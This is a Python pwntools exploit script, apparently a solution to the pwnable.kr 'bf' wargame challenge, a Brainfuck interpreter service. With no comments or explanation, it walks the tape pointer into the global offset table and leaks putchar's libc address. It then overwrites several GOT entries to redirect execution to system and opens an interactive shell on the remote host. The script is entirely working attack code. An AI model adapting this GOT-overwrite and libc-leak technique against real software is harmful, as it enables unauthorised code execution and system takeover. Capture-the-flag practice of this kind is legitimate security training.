from pwn import *



def main():
    p = remote("pwnable.kr",9001)
    libc = ELF("bf_libc.so")



    ptr = 0x0804A0A0
    putchar_got = 0x0804A030
    getchar_got = 0x0804A010
    memset_got = 0x0804A02C
    
    

    payload = (ptr-putchar_got)*'<' + '.' + '.>'*4
    payload += '<'*4 + ',>'*4
    payload += (putchar_got-memset_got+4)*'<' + ',>'*4
    payload += (memset_got-getchar_got+4)*'<'+',>'*4
    payload += '.'
    
    p.recvuntil('[ ]\n')
    p.sendline(payload)
    p.recv(1)
    putchar_libc = libc.symbols['putchar']
    getchar_libc = libc.symbols['gets']
    system_libc = libc.symbols['system']

    putchar = u32(p.recv(4))
    gets = putchar - putchar_libc + getchar_libc
    system = putchar - putchar_libc + system_libc
    main = 0x08048671

    p.send(p32(main))
    p.send(p32(gets))
    p.send(p32(system))
    p.sendline('//bin/sh\0')
    p.interactive()

    

    


if __name__ == '__main__':
    main()
